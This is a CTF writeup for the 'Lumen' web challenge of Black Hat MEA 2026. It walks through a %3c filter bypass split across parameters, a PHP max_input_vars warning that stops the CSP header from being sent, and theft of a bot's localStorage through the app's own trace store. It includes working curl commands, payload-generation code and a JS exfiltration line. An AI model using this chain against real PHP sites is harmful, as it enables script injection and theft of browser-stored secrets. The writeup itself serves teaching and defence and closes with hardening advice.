---
title: "Black Hat MEA CTF Qualification 2026 — Web Writeup (Lumen)"
date: 2026-09-06T10:00:00Z
lastmod: 2026-09-07T00:00:00Z
description: "Full step-by-step web writeup for Black Hat MEA CTF Qualification 2026. Covers Lumen: a three-stage chain combining a split-boundary %3c filter bypass for HTML injection, a PHP max_input_vars CSP header drop, and localStorage exfiltration via a same-origin trace store."
summary: "Lumen is a single PHP app whose Content-Security-Policy looks airtight from the client side — until you realise the header is set by PHP code that can be beaten by the request parser. The chain is three steps: inject one raw '<' by splitting a double-encoded percent sequence across two GET parameters; flood the request with >1000 variables to trigger an unbuffered PHP warning that races the header() call and wins; read the operator's localStorage into the app's own trace store and collect it."
tags:
  - ctf
  - web
  - xss
  - csp-bypass
  - php
  - html-injection
  - localstorage
  - blackhat-mea
  - 2026
keywords:
  - "black hat mea ctf 2026 web"
  - "blackhat mea ctf qualification 2026 writeup"
  - "lumen ctf writeup"
  - "php csp bypass"
  - "max_input_vars csp header drop"
  - "urldecode split filter bypass"
  - "double encoding xss"
  - "localstorage exfiltration xss"
  - "ctf web 2026"
  - "php display_errors csp bypass"
categories:
  - CTF Writeups
author: "CyberSecurity Elite"
cover:
  image: "/images/articles/blackhat-mea-ctf-2026-quals-web-writeup.png"
  alt: "Black Hat MEA CTF Qualification 2026 Web writeup cover — Lumen CSP bypass via PHP max_input_vars header race and split %3c filter bypass"
  relative: false
showToc: true
TocOpen: false
draft: false
---

## Overview

Black Hat MEA CTF Qualification 2026 shipped one Web challenge. **Lumen** is a three-stage exploit chain where each sub-problem is independently interesting, and together they produce a result that the application's author demonstrably tried to prevent at every layer.

| Challenge | Difficulty | Core chain | Flag |
|---|---|---|---|
| **Lumen** | ★★★★☆ | Split-boundary `%3c` bypass → PHP `max_input_vars` CSP header drop → `localStorage` exfiltration via same-origin trace store | `BHFlagY{28b936a8477bc9f9a5a5a5c23ae1878d}` |

---

## The Application

A single `index.php` serves four pages via `?p=` (`home`, `view`, `report`, `trace`). The valuable data never touches the server: a Playwright bot (`bot.js`) seeds the flag into `localStorage` and then opens whatever URL you report.

```js
// bot.js
await page.goto(SELF + '/?p=home', { waitUntil: 'load' });
await page.evaluate((f) => localStorage.setItem('flag', f), FLAG);   // <-- the target
// ...
await page.goto(target, { waitUntil: 'load' });   // <-- opens our URL
await page.waitForTimeout(4000);
```

`localStorage` is origin-scoped, so the flag is readable from **any** page on `http://127.0.0.1:5000` — but only from JavaScript running on that origin. There is no server-side reflection of the flag anywhere, ever.

**We must execute script on the origin.** That single fact drives everything below and rules out every scriptless technique (dangling-markup, CSS exfiltration, etc.) — the secret simply isn't in any HTML response to steal.

Every page response ships this header:

```
Content-Security-Policy: default-src 'none';
                         script-src 'nonce-<16 random bytes>';
                         style-src  'nonce-<same>';
                         img-src 'self';
                         base-uri 'none';
```

The page contains **no script of its own** — only a `<style nonce=…>` block in `<head>`. The nonce is cryptographically random and fresh on every response. The challenge brief says it plainly:

> *Lumen is a read-only document relay with a content security policy locked down on every page, so the operator is confident that even a stray reflection cannot run. Find the reflection, get it to run despite the policy, and convince the operator to hand it over.*

Three steps, in that order.

---

## Step 1 — Find the Reflection

`?p=view` looks up a document by concatenating `dir` and `file`, then URL-decodes the result:

```php
function clean($s) {
  if (!is_string($s)) return false;
  if (preg_match('/%3c/i', $s)) return false;      // reject encoded '<'
  return htmlspecialchars($s, ENT_QUOTES);
}

$dir  = clean($_GET['dir']);
$file = clean($_GET['file']);
// ...
$path = urldecode($dir . $file);          // ← decode AFTER cleaning
$key  = preg_replace('#^docs/#', '', $path);
if (isset($DOCS[$key])) { /* serve it */ }
else {
  echo '<div class="card"><p class="err">404 - no document at <b>'
       . $path . '</b></p>...';           // ← $path echoed RAW
}
```

`$path` is echoed without escaping. The author's defences are:

1. `htmlspecialchars(..., ENT_QUOTES)` — neutralises `< > & " '` in each parameter.
2. A hard reject on any parameter containing `%3c` (percent-encoded `<`).

The reject exists because of the **order of operations**: `clean()` runs first, then `$path` is `urldecode`-d on the concatenation. So a `%3c` in a parameter would survive `htmlspecialchars` untouched (it is not a special HTML character) and only become a real `<` at the later `urldecode`. The author saw that and blocked `%3c`.

What they missed: the `%3c` check is **per-parameter**, while the `urldecode` is on the **concatenation** `$dir . $file`. Split the three-character sequence `%3c` across the boundary:

| Parameter | Value PHP receives (after its own decode) | Passes `clean()`? | After `htmlspecialchars` |
|---|---|---|---|
| `dir` | `docs/%3` | yes — no `%3c` | `docs/%3` (unchanged) |
| `file` | `c<payload>` | yes — no `%3c` | `c<payload>` (unchanged) |

Concatenate → `docs/%3c<payload>` → `urldecode` → `docs/<<payload>`.

One real `<`, straight past the filter.

### The Double-Encoding, Precisely

Two URL-decodes happen to our bytes:

1. **PHP's automatic decode** of `$_GET` — translates wire-level `%XX` to raw bytes.
2. **`urldecode($dir . $file)`** — a second explicit decode.

`htmlspecialchars` runs between them. To place a character `C` in the final `$path` after the second decode, we must encode it **twice** on the wire:

- Wire → PHP `$_GET` decode → `%C`
- `%C` → `htmlspecialchars` → `%C` (percent-signs and hex digits are not special HTML characters, so they pass unchanged)
- `%C` → `urldecode` → `C`

This also sidesteps `htmlspecialchars` entirely for `" ' >` — they travel as `%22 %27 %3e` through the first decode, arrive at `htmlspecialchars` as `%22 %27 %3e` (not as `"`, `'`, `>`, so the function leaves them alone), and are only turned back by the second `urldecode` when they are already past the filter.

Working backwards, to inject `<img src=x onerror="…">`:

```
Target in $path : docs/<img src=x onerror="…">
$_GET['dir']    : docs/%3        (wire: docs%2F%253)
$_GET['file']   : c + urlencode(img src=x onerror="…">)
                              (wire: c + urlencode(urlencode(…)))
```

The construction in `solve/gen.py`:

```python
get_dir  = "docs/%3"
get_file = "c" + urllib.parse.quote(payload, safe="")

wire_dir  = urllib.parse.quote(get_dir, safe="")
wire_file = urllib.parse.quote(get_file, safe="")
```

Proof of concept, bypassing the per-parameter `%3c` check while injecting `<b onerror=alert(1)>`:

```bash
$ curl -s '…/?p=view&dir=docs/%253&file=cb%2520onerror%253dalert(1)%253etest' \
    | grep -o 'no document.*</b>'
no document at <b>docs/<b onerror=alert(1)>test</b>
```

One raw `<`, correct attacker-controlled element, `%3c` check never triggered.

---

## Step 2 — Drop the CSP

We have HTML injection. The CSP is:

```
script-src 'nonce-<cryptographically random>';
```

- No `'unsafe-inline'` — event handlers and `javascript:` URIs are dead.
- Nonce is `bin2hex(random_bytes(16))`, **fresh per response** — cannot be guessed.
- The nonce sits in `<head>`, before our injection in `<body>` — dangling-markup cannot steal it forward. Browsers also explicitly hide `nonce` attributes from `getAttributeNode()` and from CSS `attr()`.
- `default-src 'none'` kills `frame-src`/`object-src` — no `<iframe srcdoc>` escape.
- `base-uri 'none'` — no base tag to redirect relative resources.

Client-side, this policy does exactly what it claims. The weakness is one level down: **how the header is set**.

Look at the server runner:

```sh
exec php -d display_errors=1 -d output_buffering=0 -d max_input_vars=1000 \
     -d variables_order=GPCS -S 0.0.0.0:5000 -t /app/public
```

Four flags. Together they are the whole vulnerability:

| Flag | Value | Role |
|---|---|---|
| `max_input_vars` | `1000` | PHP caps and emits a **warning** when a request has more than 1,000 input variables. Critically, this happens during the **request-startup / input-parsing phase** — before a single line of application code executes. |
| `display_errors` | `1` | That warning is rendered to the response body. |
| `output_buffering` | `0` | Rendering is **unbuffered** — written to the network socket immediately. |
| PHP-S built-in server | (implicit) | No Apache/Nginx in front to strip or override headers. |

The sequence when a request carries more than 1,000 parameters:

```
1. PHP parses input variables → count exceeds 1000
2. PHP emits:
   <br /><b>Warning</b>: PHP Request Startup: Input variables exceeded 1000. …
3. output_buffering=0: those bytes hit the wire immediately
4. HTTP response status + headers are flushed (headers-sent = true)
5. index.php begins executing
6. Line 3: header("Content-Security-Policy: …")
7. PHP: "Cannot modify header information — headers already sent"
   → the call is silently ignored; no CSP header is ever sent
```

The response arrives with **no `Content-Security-Policy` header at all**:

```bash
$ curl -sI '…/?p=view&dir=docs%2F%253&file=c…&z1=1&z2=1…z1001=1' | grep -i csp
# (no output — header absent)
```

Compare against a normal request:

```bash
$ curl -sI '…/?p=view&dir=docs/&file=welcome' | grep -i csp
content-security-policy: default-src 'none'; script-src 'nonce-…'
```

With the CSP gone, the injected `<img onerror="…">` fires without restriction.

### Why >1000 Parameters and Not Something Else

`max_input_vars` was added to PHP to prevent hash-collision DoS attacks (sending many variables forces hash-table insertions). The **warning** it emits is the key detail — it writes text to the PHP output stream before application code runs. Any similar pre-execution output (a deprecation notice, an `auto_prepend_file` error, a startup-time `E_NOTICE`) would have the same effect with `display_errors=1` + `output_buffering=0`.

### Ordering the Parameters

PHP registers the first 1,000 variables and then drops the rest. Our payload needs `p`, `dir`, and `file` to be parsed. So we place them first, then append 1,001 dummy parameters:

```python
N_DUMMIES = 1001  # p + dir + file + 1001 dummies = 1004 total > 1000
base = "%s/?p=view&dir=%s&file=%s" % (origin, wire_dir, wire_file)
dummies = "&".join("z%d=1" % i for i in range(1, N_DUMMIES + 1))
return base + "&" + dummies
```

`p`, `dir`, `file` land within the first 3 of 1,004 variables — safely registered before PHP cuts off. The 1,001 dummies push the total past the threshold and trigger the warning.

---

## Step 3 — Exfiltrate from `localStorage`

With no CSP and a working `<img onerror>` on the bot's origin, we need to get the flag back. The cleanest channel is the application's own `trace` endpoint — a same-origin key–value store:

```php
elseif ($p === "trace"):
    $id = isset($_GET['id']) ? $_GET['id'] : "";
    if (preg_match('/^[A-Za-z0-9]{8,64}$/', $id)) {
        $d = getenv('TRACE_DIR') ?: '/tmp/lumen/trace';
        $t = $d . '/' . $id;
        if (isset($_GET['note'])) {                         // write
            file_put_contents($t, substr($_GET['note'], 0, 1024), LOCK_EX);
        } elseif (is_file($t)) {                            // read
            echo '…<pre>'.htmlspecialchars(file_get_contents($t)).'</pre>…';
        }
    }
```

`GET /?p=trace&id=<8–64 alnum>&note=<data>` writes `<data>` (up to 1,024 bytes) to a server-side file. `GET /?p=trace&id=<same>` reads it back and renders it in a `<pre>` block.

The `onerror` payload:

```js
new Image().src = '/?p=trace&id=xk7qp2mn9wab&note='
                + encodeURIComponent(JSON.stringify(localStorage))
```

`JSON.stringify(localStorage)` grabs every key at once — we do not need to guess the key name in advance. The write is a same-origin GET to an `img-src 'self'` — eligible endpoint, not that it matters without the CSP, but it would have worked **even if the CSP were intact** (sans the execution, of course). That elegance is deliberate.

We choose a random trace ID (`xk7qp2mn9wab` in the winning run), wait for the operator's browser to execute the handler, then read back the stored value:

```bash
$ curl -s '…/?p=trace&id=xk7qp2mn9wab' | grep -o '<pre>.*</pre>'
<pre>{&quot;flag&quot;:&quot;BHFlagY{28b936a8477bc9f9a5a5a5c23ae1878d}&quot;}</pre>
```

Decode HTML entities → `{"flag":"BHFlagY{28b936a8477bc9f9a5a5a5c23ae1878d}"}`.

**Flag: `BHFlagY{28b936a8477bc9f9a5a5a5c23ae1878d}`**

---

## End-to-End Delivery

The full chain in one picture:

```
Attacker                          Lumen server                     Bot (Playwright/Chromium)
   |                                    |                                   |
   |--- POST /?p=report -------> enqueue URL                               |
   |    (payload URL, ~7 KB)            |                                   |
   |                                    |--- dequeue, localise ------------> |
   |                                    |                                   |-- goto /home
   |                                    |                                   |-- localStorage.setItem('flag',FLAG)
   |                                    |                                   |-- goto payload URL (127.0.0.1:5000)
   |                                    |<------------ GET /?p=view&1001 params ------------|
   |                                    | > 1000 params: warning printed                     |
   |                                    | output_buffering=0: headers flushed                |
   |                                    | header(CSP) fails silently                         |
   |                                    | inject <img onerror=...> in 404                    |
   |                                    |------- response (no CSP) -------> browser renders  |
   |                                    |                                   |-- img.onerror fires
   |                                    |                                   |-- reads localStorage
   |                                    |<- GET /?p=trace&id=<id>&note={"flag":"…"} ---------|
   |                                    | trace file written                                  |
   |--- GET /?p=trace&id=<id> --> read trace file                          |
   |<--- {"flag":"BHFlagY{…}"} ---------+                                   |
```

The bot's `localise()` function strips the host and re-adds `http://127.0.0.1:5000`, so the query string (including all 1,004 parameters) survives verbatim. The flag ends up in the same database the attacker can read without authentication.

### Session Transcript

```bash
# [1] Verify the split-boundary filter bypass (no CSP needed)
$ curl -s '…/?p=view&dir=docs/%253&file=cb%2520onerror%253dalert(1)%253etest' \
    | grep -o 'no document.*</b>'
no document at <b>docs/<b onerror=alert(1)>test</b>

# [2] Verify the CSP header disappears with >1000 params
$ curl -sI '…/?p=view&dir=docs%2F%253&file=c…&z1=1…z1001=1' | grep -i content-security-policy
# (no output)

# [3] Deliver to the operator
$ curl -s -X POST '…/?p=report' --data-urlencode "url=$(cat artifacts/payload_url.txt)"
… Queued …

# [4] Collect the flag
$ curl -s '…/?p=trace&id=xk7qp2mn9wab' | grep -o '<pre>.*</pre>'
<pre>{&quot;flag&quot;:&quot;BHFlagY{28b936a8477bc9f9a5a5a5c23ae1878d}&quot;}</pre>
```

---

## Reproducing

```bash
cd solve
# Print the payload URL to inspect it
python3 gen.py

# Full end-to-end (report → poll trace → flag)
python3 exploit.py http://<instance-host>
```

Pure Python 3, standard library only.

---

## Key Takeaways

**A CSP is only as trustworthy as the code path that emits it.** The policy here was flawless — correct nonce, `default-src 'none'`, `base-uri 'none'`. The bug was that `header()` can lose a race to unbuffered startup output. `display_errors=1` with `output_buffering=0` turns *any* pre-execution notice — `max_input_vars`, a startup deprecation, an `auto_prepend_file` hiccup — into a security-header bypass. Security headers you cannot afford to lose should be set at the web-server layer (Nginx/Apache), not inside application code.

**Filter on the value you actually emit.** `clean()` inspected each parameter *before* the `urldecode` and concatenation that produced the sink string, so its `%3c` check operated on the wrong bytes. The rule is: **canonicalise first (decode fully), then validate, then use**. Never validate a different representation than the one you output.

**The same-origin trace store is both a convenience feature and an exfil sink.** Writing the flag via `GET /?p=trace&…&note=…` is a same-origin `img-src 'self'` request — something that would satisfy even the original strict CSP if we had only needed to write. The CSP drop was necessary only to *execute* the JavaScript, not to *transmit* the result. That layering illustrates why `img-src 'self'` in a strict CSP still needs careful review: any GET-accessible write endpoint is a potential storage channel.

**`keep-one-copy` XSS delivery**: the bot's `localise()` strips the attacker's hostname and re-uses `127.0.0.1:5000`. This means the payload always targets the right origin regardless of what public host was used to submit it — a clean design that also makes testing easier (run the bot locally against `127.0.0.1:5000` with the exact same payload URL).

---

## FAQ

**Q: Why can't we just use `javascript:` or an inline `onclick` attribute once we have HTML injection?**  
A: The CSP is `script-src 'nonce-…'` with no `'unsafe-inline'`. That directive covers both `<script>` tags and event-handler attributes. A `javascript:` URI is also blocked by `script-src`. Inline execution of any kind requires the nonce, which is random and unknown to us. The way around it is not to find a bypass — it is to eliminate the header entirely, which is Step 2.

**Q: Why does the CSP header disappear and not just arrive after the warning?**  
A: HTTP/1.1 headers must precede the body. Once the PHP process writes the warning text to the socket, the HTTP response has begun — status line and headers are committed. Any subsequent call to `header()` finds `headers_sent() === true` and silently fails. The CSP header is simply never transmitted, not delayed.

**Q: What is the maximum number of parameters before PHP emits the warning?**  
A: Exactly `max_input_vars`, which is set to `1000` here. The warning fires when the *1001st* variable is about to be registered. Since we send 1,004 (`p`, `dir`, `file` + 1,001 dummies), the threshold is crossed with `dir` and `file` safely already registered.

**Q: Could we have exfiltrated the flag without executing JavaScript, e.g. via CSS?**  
A: No. CSS exfiltration and dangling-markup attacks work only when the secret value appears in the server's HTML response — in an attribute, in text, or in a `<style>` block we can influence. The flag never appears in any server response here; it is set exclusively in `localStorage` by the bot's JavaScript. `localStorage` is not accessible to CSS. Script execution is mandatory.

**Q: What stops us from reading other users' trace files?**  
A: The trace ID is 8–64 alphanumeric characters chosen by the submitter. The server does no access control — anyone who knows the ID can read the file. In a real app this would be a bug; here it is the intended retrieval mechanism. We choose a sufficiently random ID so only we know it.

**Q: Why use `JSON.stringify(localStorage)` instead of `localStorage.getItem('flag')` directly?**  
A: `JSON.stringify(localStorage)` grabs all keys in one string. Since we don't know the key name in advance (the challenge brief says the bot stores "something valuable"), not hardcoding `'flag'` means the payload works even if the key name changes. It is also slightly shorter because it avoids the extra property access.

**Q: Would the attack work if `output_buffering` were set to any non-zero value?**  
A: No. With `output_buffering=N`, PHP accumulates up to N bytes before flushing. The warning would be buffered, and by the time any output is sent to the socket, `index.php` would have already run `header("Content-Security-Policy: …")` — which lands in the buffer before the warning is flushed. The CSP header would be emitted normally. The vulnerability requires `output_buffering=0` specifically.

---

*Full source — solve scripts, payload generator, and winning session transcript — available at [github.com/Abdelkad3r/BlackHat-MEA-CTF-Qualification-2026](https://github.com/Abdelkad3r/BlackHat-MEA-CTF-Qualification-2026).*
